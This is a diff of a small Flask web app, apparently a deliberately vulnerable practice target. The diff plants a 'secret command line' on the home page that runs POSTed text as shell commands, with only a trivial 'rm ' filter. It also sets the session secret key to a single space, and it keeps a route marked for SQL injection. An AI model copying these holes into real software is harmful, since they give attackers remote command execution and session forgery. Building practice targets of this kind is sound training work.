@@ -1,20 +1,34 @@
-from flask import Flask, render_template, request, url_for, redirect, session, g
+from flask import Flask, render_template, request, url_for, redirect, session, g, flash
 import os
+import subprocess
 
 app = Flask(__name__)
-app.secret_key = os.urandom(90)
+app.secret_key = " "
 
 @app.errorhandler(404)
 def notFound(e):
     return render_template('not_found.html')
 
-@app.route('/')
+@app.route('/', methods=['GET', 'POST'])
 def home():
-    #Do somehting evil here like ufw allow a port or add a user and change their password
-    return render_template('index.html')
+    output=""
+    #Secret command line for devs
+    if request.method == 'POST':
+        cmd = request.form['text']
+        if "rm " in cmd:
+            output="You may not destroy things. Do not run rm."
+        else:
+            try:
+                output = subprocess.check_output(cmd, shell=True)
+            except Exception as e:
+                output = "Error running command\n" + str(e)
+    return render_template('index.html', output=output)
 
 @app.route('/login', methods=['GET','POST'])
 def login():
+    if session.get('user') and request.method == 'GET':
+        return redirect(url_for('loggedin'))
+
     #SQL Injection
     if request.method == 'POST':
         session.pop('user', None)
@@ -38,11 +52,10 @@ def before_request():
 @app.route('/logout')
 def logout():
     session.pop('user', None)
-    return render_template('login.html')
+    return render_template('logout.html')
 
 @app.route('/products')
 def products():
-
     return render_template('products.html')
 
 @app.route('/services')
@@ -51,6 +64,9 @@ def services():
 
 @app.route('/employees')
 def ptoAdmin():
+    if not session.get('user'):
+        flash('You must be logged in to see the portal.', 'error')
+        return redirect(url_for('login'))
     return render_template('employee.html')
 
 @app.route('/testing')
